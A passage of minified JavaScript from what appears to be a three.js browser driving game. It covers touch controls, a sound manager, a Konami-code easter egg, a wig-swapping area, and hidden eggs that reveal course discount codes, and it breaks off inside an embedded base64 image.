0.3s",this.touch.forward.$element.style.willChange="opacity",this.touch.forward.$element.style.opacity="0",document.body.appendChild(this.touch.forward.$element),this.touch.forward.$border=document.createElement("div"),this.touch.forward.$border.style.position="absolute",this.touch.forward.$border.style.top="calc(50% - 30px)",this.touch.forward.$border.style.left="calc(50% - 30px)",this.touch.forward.$border.style.width="60px",this.touch.forward.$border.style.height="60px",this.touch.forward.$border.style.border="2px solid #ffffff",this.touch.forward.$border.style.borderRadius="10px",this.touch.forward.$border.style.boxSizing="border-box",this.touch.forward.$border.style.opacity="0.25",this.touch.forward.$border.style.willChange="opacity",this.touch.forward.$element.appendChild(this.touch.forward.$border),this.touch.forward.$icon=document.createElement("div"),this.touch.forward.$icon.style.position="absolute",this.touch.forward.$icon.style.top="calc(50% - 9px)",this.touch.forward.$icon.style.left="calc(50% - 11px)",this.touch.forward.$icon.style.width="22px",this.touch.forward.$icon.style.height="18px",this.touch.forward.$icon.style.backgroundImage="url(".concat(Jd,")"),this.touch.forward.$icon.style.backgroundSize="cover",this.touch.forward.$element.appendChild(this.touch.forward.$icon),this.touch.forward.events={},this.touch.forward.touchIdentifier=null,this.touch.forward.events.touchstart=function(t){t.preventDefault();var i=t.changedTouches[0];i&&(e.camera.pan.reset(),e.touch.forward.touchIdentifier=i.identifier,e.actions.up=!0,e.touch.forward.$border.style.opacity="0.5",document.addEventListener("touchend",e.touch.forward.events.touchend))},this.touch.forward.events.touchend=function(t){tp(t.changedTouches).find((function(t){return t.identifier===e.touch.forward.touchIdentifier}))&&(e.actions.up=!1,e.touch.forward.$border.style.opacity="0.25",document.removeEventListener("touchend",e.touch.forward.events.touchend))},this.touch.forward.$element.addEventListener("touchstart",this.touch.forward.events.touchstart),this.touch.brake={},this.touch.brake.$element=document.createElement("div"),this.touch.brake.$element.style.userSelect="none",this.touch.brake.$element.style.position="fixed",this.touch.brake.$element.style.bottom="calc(70px + 15px)",this.touch.brake.$element.style.right="0px",this.touch.brake.$element.style.width="95px",this.touch.brake.$element.style.height="70px",this.touch.brake.$element.style.transition="opacity 0.3s 0.2s",this.touch.brake.$element.style.willChange="opacity",this.touch.brake.$element.style.opacity="0",document.body.appendChild(this.touch.brake.$element),this.touch.brake.$border=document.createElement("div"),this.touch.brake.$border.style.position="absolute",this.touch.brake.$border.style.top="calc(50% - 30px)",this.touch.brake.$border.style.left="calc(50% - 30px)",this.touch.brake.$border.style.width="60px",this.touch.brake.$border.style.height="60px",this.touch.brake.$border.style.border="2px solid #ffffff",this.touch.brake.$border.style.borderRadius="10px",this.touch.brake.$border.style.boxSizing="border-box",this.touch.brake.$border.style.opacity="0.25",this.touch.brake.$border.style.willChange="opacity",this.touch.brake.$element.appendChild(this.touch.brake.$border),this.touch.brake.$icon=document.createElement("div"),this.touch.brake.$icon.style.position="absolute",this.touch.brake.$icon.style.top="calc(50% - 7px)",this.touch.brake.$icon.style.left="calc(50% - 7px)",this.touch.brake.$icon.style.width="15px",this.touch.brake.$icon.style.height="15px",this.touch.brake.$icon.style.backgroundImage="url(".concat(Kd,")"),this.touch.brake.$icon.style.backgroundSize="cover",this.touch.brake.$icon.style.transform="rotate(180deg)",this.touch.brake.$element.appendChild(this.touch.brake.$icon),this.touch.brake.events={},this.touch.brake.touchIdentifier=null,this.touch.brake.events.touchstart=function(t){t.preventDefault();var i=t.changedTouches[0];i&&(e.touch.brake.touchIdentifier=i.identifier,e.actions.brake=!0,e.touch.brake.$border.style.opacity="0.5",document.addEventListener("touchend",e.touch.brake.events.touchend))},this.touch.brake.events.touchend=function(t){tp(t.changedTouches).find((function(t){return t.identifier===e.touch.brake.touchIdentifier}))&&(e.actions.brake=!1,e.touch.brake.$border.style.opacity="0.25",document.removeEventListener("touchend",e.touch.brake.events.touchend))},this.touch.brake.$element.addEventListener("touchstart",this.touch.brake.events.touchstart),this.touch.backward={},this.touch.backward.$element=document.createElement("div"),this.touch.backward.$element.style.userSelect="none",this.touch.backward.$element.style.position="fixed",this.touch.backward.$element.style.bottom="15px",this.touch.backward.$element.style.right="0px",this.touch.backward.$element.style.width="95px",this.touch.backward.$element.style.height="70px",this.touch.backward.$element.style.transition="opacity 0.3s 0.1s",this.touch.backward.$element.style.willChange="opacity",this.touch.backward.$element.style.opacity="0",document.body.appendChild(this.touch.backward.$element),this.touch.backward.$border=document.createElement("div"),this.touch.backward.$border.style.position="absolute",this.touch.backward.$border.style.top="calc(50% - 30px)",this.touch.backward.$border.style.left="calc(50% - 30px)",this.touch.backward.$border.style.width="60px",this.touch.backward.$border.style.height="60px",this.touch.backward.$border.style.border="2px solid #ffffff",this.touch.backward.$border.style.borderRadius="10px",this.touch.backward.$border.style.boxSizing="border-box",this.touch.backward.$border.style.opacity="0.25",this.touch.backward.$border.style.willChange="opacity",this.touch.backward.$element.appendChild(this.touch.backward.$border),this.touch.backward.$icon=document.createElement("div"),this.touch.backward.$icon.style.position="absolute",this.touch.backward.$icon.style.top="calc(50% - 9px)",this.touch.backward.$icon.style.left="calc(50% - 11px)",this.touch.backward.$icon.style.width="22px",this.touch.backward.$icon.style.height="18px",this.touch.backward.$icon.style.backgroundImage="url(".concat(Jd,")"),this.touch.backward.$icon.style.backgroundSize="cover",this.touch.backward.$icon.style.transform="rotate(180deg)",this.touch.backward.$element.appendChild(this.touch.backward.$icon),this.touch.backward.events={},this.touch.backward.touchIdentifier=null,this.touch.backward.events.touchstart=function(t){t.preventDefault();var i=t.changedTouches[0];i&&(e.camera.pan.reset(),e.touch.backward.touchIdentifier=i.identifier,e.actions.down=!0,e.touch.backward.$border.style.opacity="0.5",document.addEventListener("touchend",e.touch.backward.events.touchend))},this.touch.backward.events.touchend=function(t){tp(t.changedTouches).find((function(t){return t.identifier===e.touch.backward.touchIdentifier}))&&(e.actions.down=!1,e.touch.backward.$border.style.opacity="0.25",document.removeEventListener("touchend",e.touch.backward.events.touchend))},this.touch.backward.$element.addEventListener("touchstart",this.touch.backward.events.touchstart),this.touch.reveal=function(){e.touch.joystick.$element.style.opacity=1,e.touch.backward.$element.style.opacity=1,e.touch.brake.$element.style.opacity=1,e.touch.forward.$element.style.opacity=1,e.touch.boost.$element.style.opacity=1}}}])&&ip(i.prototype,n),r&&ip(i,r),t}(qh),sp=i(2),cp=i.p+"static/audios/2f78a206af8d85bb336b5e5c8d2f36aa.mp3",lp=i.p+"static/audios/a1c221fb449725181ab2d24b228bd17d.mp3",hp=i.p+"static/audios/cfc09e40fadd36f4c57285f15df6eea6.mp3",up=i.p+"static/audios/1c72d254532628132d337a75f7d78564.mp3",dp=i.p+"static/audios/15d9bebca5b0b33f5c94124bafdb9b8c.mp3",pp=i.p+"static/audios/e82bcaba1066cf17886dd737aed71e0e.mp3",fp=i.p+"static/audios/d0102d5c0c3edb7247c175e6b5c25b4a.mp3",mp=i.p+"static/audios/53bca276d57a71ad51e7ba96da265380.mp3",vp=i.p+"static/audios/6a455468defd570010bdf9af7e9bbba3.mp3",gp=i.p+"static/audios/bbe9392bb2079018b2759f973c642263.mp3",yp=i.p+"static/audios/50520f81a12c839e252667caa59d6896.mp3",bp=i.p+"static/audios/1e3461ac9b1ad0f70f6c1de7c6bd298e.mp3",wp=i.p+"static/audios/b2f265096a765bcb740c2ab5679f09f8.mp3",xp=i.p+"static/audios/3f4f7920c91a341e7aa5b8e8e666d00a.mp3",_p=i.p+"static/audios/ea1c3640d110b54538bb1bc280137bb1.mp3",Mp=i.p+"static/audios/915c0e94093a7bf5243f8d8858f0f8b9.mp3",Sp=i.p+"static/audios/d1978a9b378c152202ad73bf7774f59e.mp3",Tp=i.p+"static/audios/c43caf6fcfd54b4d303308becc1f5a0d.mp3",Ep=i.p+"static/audios/548ef8b74995d717d66173367361abfc.mp3",Ap=i.p+"static/audios/d3599d5d8094ab5af7fd3d48be6b35aa.mp3",Cp=i.p+"static/audios/0cfa1e083ffcfba96d9118f1799307b6.mp3";function Pp(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Lp=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.debug=t.debug,this.debug&&(this.debugFolder=this.debug.addFolder("sounds")),this.items=[],this.setSettings(),this.setMasterVolume(),this.setMute(),this.setEngine()}var t,i,n;return t=e,(i=[{key:"setSettings",value:function(){this.settings=[{name:"reveal",sounds:[cp],minDelta:100,velocityMin:0,velocityMultiplier:1,volumeMin:1,volumeMax:1,rateMin:1,rateMax:1},{name:"brick",sounds:[hp,up,dp,pp,fp,mp],minDelta:100,velocityMin:1,velocityMultiplier:.75,volumeMin:.2,volumeMax:.85,rateMin:.5,rateMax:.75},{name:"bowlingPin",sounds:[vp],minDelta:0,velocityMin:1,velocityMultiplier:.5,volumeMin:.35,volumeMax:1,rateMin:.1,rateMax:.85},{name:"bowlingBall",sounds:[vp,vp,vp],minDelta:0,velocityMin:1,velocityMultiplier:.5,volumeMin:.35,volumeMax:1,rateMin:.1,rateMax:.2},{name:"carHit",sounds:[gp,yp,bp,wp],minDelta:100,velocityMin:2,velocityMultiplier:1,volumeMin:.2,volumeMax:.6,rateMin:.35,rateMax:.55},{name:"woodHit",sounds:[xp],minDelta:30,velocityMin:1,velocityMultiplier:1,volumeMin:.5,volumeMax:1,rateMin:.75,rateMax:1.5},{name:"screech",sounds:[_p],minDelta:1e3,velocityMin:0,velocityMultiplier:1,volumeMin:.75,volumeMax:1,rateMin:.9,rateMax:1.1},{name:"uiArea",sounds:[Mp],minDelta:100,velocityMin:0,velocityMultiplier:1,volumeMin:.75,volumeMax:1,rateMin:.95,rateMax:1.05},{name:"carHorn1",sounds:[Sp],minDelta:0,velocityMin:0,velocityMultiplier:1,volumeMin:.95,volumeMax:1,rateMin:1,rateMax:1},{name:"carHorn2",sounds:[Tp],minDelta:0,velocityMin:0,velocityMultiplier:1,volumeMin:.95,volumeMax:1,rateMin:1,rateMax:1},{name:"horn",sounds:[Ep,Ap,Cp],minDelta:100,velocityMin:1,velocityMultiplier:.75,volumeMin:.5,volumeMax:1,rateMin:.75,rateMax:1}];var e=!0,t=!1,i=void 0;try{for(var n,r=this.settings[Symbol.iterator]();!(e=(n=r.next()).done);e=!0){var o=n.value;this.add(o)}}catch(e){t=!0,i=e}finally{try{e||null==r.return||r.return()}finally{if(t)throw i}}}},{key:"setMasterVolume",value:function(){var e=this;this.masterVolume=.5,sp.Howler.volume(this.masterVolume),window.requestAnimationFrame((function(){sp.Howler.volume(e.masterVolume)})),this.debug&&this.debugFolder.add(this,"masterVolume").step(.001).min(0).max(1).onChange((function(){sp.Howler.volume(e.masterVolume)}))}},{key:"setMute",value:function(){var e=this;this.muted=void 0!==this.debug,sp.Howler.mute(this.muted),window.addEventListener("keydown",(function(t){"m"===t.key&&(e.muted=!e.muted,sp.Howler.mute(e.muted))})),document.addEventListener("visibilitychange",(function(){document.hidden?sp.Howler.mute(!0):sp.Howler.mute(e.muted)})),this.debug&&this.debugFolder.add(this,"muted").listen().onChange((function(){sp.Howler.mute(e.muted)}))}},{key:"setEngine",value:function(){var e=this;if(this.engine={},this.engine.progress=0,this.engine.progressEasingUp=.3,this.engine.progressEasingDown=.15,this.engine.speed=0,this.engine.speedMultiplier=2.5,this.engine.acceleration=0,this.engine.accelerationMultiplier=.4,this.engine.rate={},this.engine.rate.min=.4,this.engine.rate.max=1.4,this.engine.volume={},this.engine.volume.min=.4,this.engine.volume.max=1,this.engine.volume.master=0,this.engine.sound=new sp.Howl({src:[lp],loop:!0}),this.engine.sound.play(),this.time.on("tick",(function(){var t=Math.abs(e.engine.speed)*e.engine.speedMultiplier+Math.max(e.engine.acceleration,0)*e.engine.accelerationMultiplier;t=Math.min(Math.max(t,0),1),e.engine.progress+=(t-e.engine.progress)*e.engine[t>e.engine.progress?"progressEasingUp":"progressEasingDown"];var i=e.engine.rate.max-e.engine.rate.min;e.engine.sound.rate(e.engine.rate.min+i*e.engine.progress);var n=e.engine.volume.max-e.engine.volume.min;e.engine.sound.volume((e.engine.volume.min+n*e.engine.progress)*e.engine.volume.master)})),this.debug){var t=this.debugFolder.addFolder("engine");t.open(),t.add(this.engine,"progressEasingUp").step(.001).min(0).max(1).name("progressEasingUp"),t.add(this.engine,"progressEasingDown").step(.001).min(0).max(1).name("progressEasingDown"),t.add(this.engine.rate,"min").step(.001).min(0).max(4).name("rateMin"),t.add(this.engine.rate,"max").step(.001).min(0).max(4).name("rateMax"),t.add(this.engine,"speedMultiplier").step(.01).min(0).max(5).name("speedMultiplier"),t.add(this.engine,"accelerationMultiplier").step(.01).min(0).max(100).name("accelerationMultiplier"),t.add(this.engine,"progress").step(.01).min(0).max(1).name("progress").listen()}}},{key:"add",value:function(e){var t={name:e.name,minDelta:e.minDelta,velocityMin:e.velocityMin,velocityMultiplier:e.velocityMultiplier,volumeMin:e.volumeMin,volumeMax:e.volumeMax,rateMin:e.rateMin,rateMax:e.rateMax,lastTime:0,sounds:[]},i=!0,n=!1,r=void 0;try{for(var o,a=e.sounds[Symbol.iterator]();!(i=(o=a.next()).done);i=!0){var s=o.value,c=new sp.Howl({src:[s]});t.sounds.push(c)}}catch(e){n=!0,r=e}finally{try{i||null==a.return||a.return()}finally{if(n)throw r}}this.items.push(t)}},{key:"play",value:function(e,t){var i=this.items.find((function(t){return t.name===e})),n=Date.now(),r=void 0===t?0:t;if(i&&n>i.lastTime+i.minDelta&&(0===i.velocityMin||r>i.velocityMin)){var o=i.sounds[Math.floor(Math.random()*i.sounds.length)],a=Math.min(Math.max((r-i.velocityMin)*i.velocityMultiplier,i.volumeMin),i.volumeMax);a=Math.pow(a,2),o.volume(a);var s=i.rateMax-i.rateMin;o.rate(i.rateMin+Math.random()*s),o.play(),i.lastTime=n}}}])&&Pp(t.prototype,i),n&&Pp(t,n),e}();function Rp(e){return function(e){if(Array.isArray(e)){for(var t=0,i=new Array(e.length);t<e.length;t++)i[t]=e[t];return i}}(e)||function(e){if(Symbol.iterator in Object(e)||"[object Arguments]"===Object.prototype.toString.call(e))return Array.from(e)}(e)||function(){throw new TypeError("Invalid attempt to spread non-iterable instance")}()}function kp(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function Op(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?kp(Object(i),!0).forEach((function(t){Ip(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):kp(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}function Ip(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function Bp(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Dp=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.resources=t.resources,this.car=t.car,this.walls=t.walls,this.objects=t.objects,this.materials=t.materials,this.areas=t.areas,this.config=t.config,this.physics=t.physics,this.container=new K,this.container.matrixAutoUpdate=!1,this.setKonamiCode(),this.setWigs()}var t,i,n;return t=e,(i=[{key:"setKonamiCode",value:function(){var e=this;this.konamiCode={},this.konamiCode.x=-60,this.konamiCode.y=-100,this.konamiCode.sequence=["ArrowUp","ArrowUp","ArrowDown","ArrowDown","ArrowLeft","ArrowRight","ArrowLeft","ArrowRight"],this.config.touch||this.konamiCode.sequence.push("b","a"),this.konamiCode.keyIndex=0,this.konamiCode.latestKeys=[],this.konamiCode.count=0,this.config.touch?this.konamiCode.labelTexture=this.resources.items.konamiLabelTouchTexture:this.konamiCode.labelTexture=this.resources.items.konamiLabelTexture,this.konamiCode.labelTexture.magFilter=1003,this.konamiCode.labelTexture.minFilter=1006,this.konamiCode.label=new Lt(new si(8,.5),new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.konamiCode.labelTexture})),this.konamiCode.label.position.x=this.konamiCode.x+5,this.konamiCode.label.position.y=this.konamiCode.y,this.konamiCode.label.matrixAutoUpdate=!1,this.konamiCode.label.updateMatrix(),this.container.add(this.konamiCode.label),this.konamiCode.lemonOption={base:this.resources.items.lemonBase.scene,collision:this.resources.items.lemonCollision.scene,offset:new y(0,0,0),rotation:new F(.5*Math.PI,.3*-Math.PI,0),duplicated:!0,shadow:{sizeX:1.2,sizeY:1.8,offsetZ:-.15,alpha:.35},mass:.5,sleep:!0,soundName:"woodHit"},this.objects.add(Op({},this.konamiCode.lemonOption,{offset:new y(this.konamiCode.x,this.konamiCode.y,.4)})),this.konamiCode.testInput=function(t){if(e.konamiCode.latestKeys.push(t),e.konamiCode.latestKeys.length>e.konamiCode.sequence.length&&e.konamiCode.latestKeys.shift(),e.konamiCode.sequence.toString()===e.konamiCode.latestKeys.toString()){e.konamiCode.count++;for(var i=0;i<Math.pow(3,e.konamiCode.count);i++)window.setTimeout((function(){var t=e.car.chassis.object.position.x+10*(Math.random()-.5),i=e.car.chassis.object.position.y+10*(Math.random()-.5);e.objects.add(Op({},e.konamiCode.lemonOption,{offset:new y(t,i,10),rotation:new F(Math.random()*Math.PI*2,Math.random()*Math.PI*2,Math.random()*Math.PI*2),sleep:!1}))}),50*i)}},window.addEventListener("keydown",(function(t){e.konamiCode.testInput(t.key)})),this.konamiCode.touch={},this.konamiCode.touch.x=0,this.konamiCode.touch.y=0,this.konamiCode.touch.touchstart=function(t){window.addEventListener("touchend",e.konamiCode.touch.touchend),e.konamiCode.touch.x=t.changedTouches[0].clientX,e.konamiCode.touch.y=t.changedTouches[0].clientY},this.konamiCode.touch.touchend=function(t){window.removeEventListener("touchend",e.konamiCode.touch.touchend);var i=t.changedTouches[0].clientX,n=t.changedTouches[0].clientY,r=i-e.konamiCode.touch.x,o=n-e.konamiCode.touch.y;if(Math.hypot(r,o)>30){var a=Math.atan2(o,r),s=null;s=a<.75*-Math.PI?"ArrowLeft":a<.25*-Math.PI?"ArrowUp":a<.25*Math.PI?"ArrowRight":a<.75*Math.PI?"ArrowDown":"ArrowLeft",e.konamiCode.testInput(s)}},window.addEventListener("touchstart",this.konamiCode.touch.touchstart)}},{key:"setWigs",value:function(){var e=this;this.wigs={},this.wigs.currentWig=null,this.wigs.container=new K,this.wigs.container.position.x=-.1,this.wigs.container.position.y=-30,this.wigs.container.matrixAutoUpdate=!1,this.wigs.container.updateMatrix(),this.container.add(this.wigs.container),this.wigs.materials=[this.materials.shades.items.green,this.materials.shades.items.red,this.materials.shades.items.emeraldGreen,this.materials.shades.items.purple,this.materials.shades.items.yellow,this.materials.shades.items.white],this.wigs.list=[this.resources.items.wig1,this.resources.items.wig2,this.resources.items.wig3,this.resources.items.wig4],this.wigs.items=[];var t=!0,i=!1,n=void 0;try{for(var r,o=this.wigs.list[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=new K;s.visible=!1,s.matrixAutoUpdate=!1,this.wigs.container.add(s);var c=Rp(a.scene.children),l=!0,h=!1,u=void 0;try{for(var d,p=c[Symbol.iterator]();!(l=(d=p.next()).done);l=!0){var m=d.value;m.material=this.wigs.materials[0],s.add(m)}}catch(e){h=!0,u=e}finally{try{l||null==p.return||p.return()}finally{if(h)throw u}}this.wigs.items.push(s)}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}this.wigs.change=function(){e.wigs.currentWig&&(e.wigs.currentWig.visible=!1);var t=null;do{t=e.wigs.items[Math.floor(Math.random()*e.wigs.items.length)]}while(e.wigs.currentWig===t);e.wigs.currentWig=t,e.wigs.currentWig.visible=!0;var i=e.wigs.materials[Math.floor(Math.random()*e.wigs.materials.length)],n=!0,r=!1,o=void 0;try{for(var a,s=e.wigs.currentWig.children[Symbol.iterator]();!(n=(a=s.next()).done);n=!0)a.value.material=i}catch(e){r=!0,o=e}finally{try{n||null==s.return||s.return()}finally{if(r)throw o}}},this.wigs.area=this.areas.add({position:new f(0,80),halfExtents:new f(2,2)}),this.wigs.area.on("interact",this.wigs.change),this.resources.items.areaQuestionMarkTexture.magFilter=1003,this.resources.items.areaQuestionMarkTexture.minFilter=1006,this.wigs.areaLabel=new Lt(new si(1,1),new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.resources.items.areaQuestionMarkTexture})),this.wigs.areaLabel.position.x=0,this.wigs.areaLabel.position.y=80,this.wigs.areaLabel.matrixAutoUpdate=!1,this.wigs.areaLabel.updateMatrix(),this.container.add(this.wigs.areaLabel)}},{key:"setEggs",value:function(){var e=this;this.eggs={},this.eggs.items=[],console.log("🥚 2021eggbvpoabe");var t=[{offset:new y(-29.8,-18.94,.5),material:this.materials.shades.items.emeraldGreen,code:"MjAyMWVnZ2Fvem5kZXo="},{offset:new y(103.91,128.56,.5),material:this.materials.shades.items.red,code:"MjAyMWVnZ3Fxc3ZwcG8="},{offset:new y(39.68,-23.67,.5),material:this.materials.shades.items.purple,code:"MjAyMWVnZ212b2Focnc="},{offset:new y(107.62,-155.75,.5),material:this.materials.shades.items.blue,code:"MjAyMWVnZ2N1ZHBhaW4="}];this.eggs.add=function(t){var i={found:!1};i.code=t.code,i.object=e.objects.add({base:e.resources.items.eggBase.scene,collision:e.resources.items.eggCollision.scene,duplicated:!0,shadow:{sizeX:1.2,sizeY:1.8,offsetZ:-.15,alpha:.35},mass:.5,sleep:void 0===t.sleep||t.sleep,soundName:"woodHit",offset:t.offset,rotation:void 0!==t.sleep?t.rotation:new F(0,0,0)}),i.object.container.children[0].material=t.material,i.collisionCallback=function(t){if(t.body===e.physics.car.chassis.body&&!i.found){i.found=!0;var n=atob(i.code);window.setTimeout((function(){window.confirm("\nYou find an egg!\nHere is your code for a 30% discount on https://threejs-journey.xyz\n".concat(n,"\n\nWould you like to go on the subscription page?\n                        "))&&window.open("https://threejs-journey.xyz/subscribe/".concat(n),"_blank"),window.setTimeout((function(){i.found=!1}),1e3)}),600)}},i.object.collision.body.addEventListener("collide",i.collisionCallback),e.eggs.items.push(i)};for(var i=0,n=t;i<n.length;i++){var r=n[i];this.eggs.add(r)}}}])&&Bp(t.prototype,i),n&&Bp(t,n),e}();function zp(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function Fp(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?zp(Object(i),!0).forEach((function(t){Np(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):zp(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}function Np(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function jp(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Up=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.config=t.config,this.debug=t.debug,this.resources=t.resources,this.time=t.time,this.sizes=t.sizes,this.camera=t.camera,this.renderer=t.renderer,this.passes=t.passes,this.debug&&(this.debugFolder=this.debug.addFolder("world"),this.debugFolder.open()),this.container=new K,this.container.matrixAutoUpdate=!1,this.setSounds(),this.setControls(),this.setFloor(),this.setAreas(),this.setStartingScreen()}var t,i,n;return t=e,(i=[{key:"start",value:function(){var e=this;window.setTimeout((function(){e.camera.pan.enable()}),2e3),this.setReveal(),this.setMaterials(),this.setShadows(),this.setPhysics(),this.setZones(),this.setObjects(),this.setCar(),this.areas.car=this.car,this.setTiles(),this.setWalls(),this.setSections(),this.setEasterEggs()}},{key:"setReveal",value:function(){var e=this;this.reveal={},this.reveal.matcapsProgress=0,this.reveal.floorShadowsProgress=0,this.reveal.previousMatcapsProgress=null,this.reveal.previousFloorShadowsProgress=null,this.reveal.go=function(){Du.e.fromTo(e.reveal,3,{matcapsProgress:0},{matcapsProgress:1}),Du.e.fromTo(e.reveal,3,{floorShadowsProgress:0},{floorShadowsProgress:1,delay:.5}),Du.e.fromTo(e.shadows,3,{alpha:0},{alpha:.5,delay:.5}),e.sections.intro&&(Du.e.fromTo(e.sections.intro.instructions.arrows.label.material,.3,{opacity:0},{opacity:1,delay:.5}),e.sections.intro.otherInstructions&&Du.e.fromTo(e.sections.intro.otherInstructions.label.material,.3,{opacity:0},{opacity:1,delay:.75})),e.physics.car.chassis.body.sleep(),e.physics.car.chassis.body.position.set(0,0,12),window.setTimeout((function(){e.physics.car.chassis.body.wakeUp()}),300),Du.e.fromTo(e.sounds.engine.volume,.5,{master:0},{master:.7,delay:.3,ease:Du.c.easeIn}),window.setTimeout((function(){e.sounds.play("reveal")}),400),e.controls.touch&&window.setTimeout((function(){e.controls.touch.reveal()}),400)},this.time.on("tick",(function(){if(e.reveal.matcapsProgress!==e.reveal.previousMatcapsProgress){for(var t in e.materials.shades.items)e.materials.shades.items[t].uniforms.uRevealProgress.value=e.reveal.matcapsProgress;e.reveal.previousMatcapsProgress=e.reveal.matcapsProgress}if(e.reveal.floorShadowsProgress!==e.reveal.previousFloorShadowsProgress){var i=!0,n=!1,r=void 0;try{for(var o,a=e.objects.floorShadows[Symbol.iterator]();!(i=(o=a.next()).done);i=!0)o.value.material.uniforms.uAlpha.value=e.reveal.floorShadowsProgress}catch(e){n=!0,r=e}finally{try{i||null==a.return||a.return()}finally{if(n)throw r}}e.reveal.previousFloorShadowsProgress=e.reveal.floorShadowsProgress}})),this.debug&&(this.debugFolder.add(this.reveal,"matcapsProgress").step(1e-4).min(0).max(1).name("matcapsProgress"),this.debugFolder.add(this.reveal,"floorShadowsProgress").step(1e-4).min(0).max(1).name("floorShadowsProgress"),this.debugFolder.add(this.reveal,"go").name("reveal"))}},{key:"setStartingScreen",value:function(){var e=this;this.startingScreen={},this.startingScreen.area=this.areas.add({position:new f(0,0),halfExtents:new f(2.35,1.5),hasKey:!1,testCar:!1,active:!1}),this.startingScreen.loadingLabel={},this.startingScreen.loadingLabel.geometry=new si(2.5,.625),this.startingScreen.loadingLabel.image=new Image,this.startingScreen.loadingLabel.image.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAABACAYAAAD1Xam+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAArDSURBVHhe7Z2hrhU9F4bRXAgXwE1wBwSPJEEjsTgkCodBoVAIDAJDQhAIDAKBIEEgSDD7+5/znyZNz7tWO3u3M+1MV/LkI+vMzO7MrL5dXe3e363/2WkymRwW6ZxMJsdAOieTyTGQzslkcgykczKZHAPpnEwmx0A6J5PJMZDOyWRyDKRzMpkcA+mcGDx8+FD6J5NBkc6Jwbdv307Yjx8/Tu/fvz+9ePHidO/ePXnsVrx69er07t07yegCxrNW9wUl93bp+TtEOrvl7t27pzdv3si/tYbP/vfv35UApPbr16/Tx48fT8+fP5fnrsn379+vW3XTnj17Js8ZBTqpZSX3ljufd/z169fT27dvT/fv35fX2BnS2S1fvny5elmMxGuPvIz2OXv58qU8d02mANh45yPeIcMLRrz1IOoNkc4u+fDhw/Vr+b8x6q6Ztn369On6k7WRHTCCqHPXZArArdPTp0+vOm86SOTOT2Ms2O/fv6+ygvhaO0E6b4AKqnnTWlid7+/fv6sF9Z8/f64/VRsBp84rgYB9/Pix/NtSji4ApO50WIz/PnnypPh8BJz6jmVkgeFaO0E6b0BhqVdj5KV9qt21IIhyFgfaEhilCFTuo8Yos7UAXJIFIYS1jef6+vXrq+uXCogl9jucDkjnDUo6wNbWUgTIQjyj06nzSkizG0agS7KBmgJAZ+AcharBIGB0nnM7CuLRyhi9S6cQ/Ds17quHKV5lpFNCut2r8XJKqrY930Nsl2QDNQXAy/zSa1EAjQ1hO6dQS22ntoXOWyoAwGpTbFutPjVGOiVphbQnK62+e/O7Ho1OpO7DY4kA0Ck8Ubh06ndONhBWempamLsvEQBgSRDb6egP0tkMr5JOmq3OqYlV5e3VzkmllwhA6GxsalIBXqv2c242kLK0A6csPZ8273wpUDqbsbUA1AroNYzRR91DjlIBYIoR28+fP2/UHmo+rxoFzrUFABBGpiWX1mY6RTqbsbUA8ALpIKXk5qP8XZ1Xg1xNI+3ANSxdUaklAOeKWcoWAhBnjbVWajpCOpuxtQAsJcwBlREMJYXHVpTsTDzXuG/SX08AeJe8s4BXYKXjqXuAtHg4gu0oG5DOZowkALmlT0YGdd5aEICtjH0JdFpPANIRM2y+UeYJQMv7aGk72RQknc0YSQC8gqE1+nudIE6ta0E7ahvXDKPbGgIALe6jpVEvUfcxINKZxdsg4qVGowgA9+cFpTUPXFsA2DmXPn+C0zLWsnPHcQ/h+msJwGjLszvaEiydWbzAoJOrc6BnAWC5JxTgvOKftya8tgAoaL9lcae1jttCAHKk16beQJ0CQVuyPk87LFvr/XSGdGbZQgDYz91yPdYL4Ni8HWE9CICXAcTfVxhFALzvB5A5qHOAeFEbxCybArCAtQWAIAgpefhiR21KBCA39+tBAEo74igCwCYly6wvYDENDfGSFmstS98PsYrY19jA1DHSmWVNAeAFpMHVogLvBXCw3Df+vGv0IABxMPckAKTxvH8FUy5lfJ46HtIsiEwhFG2t68UDC88pCAjTDe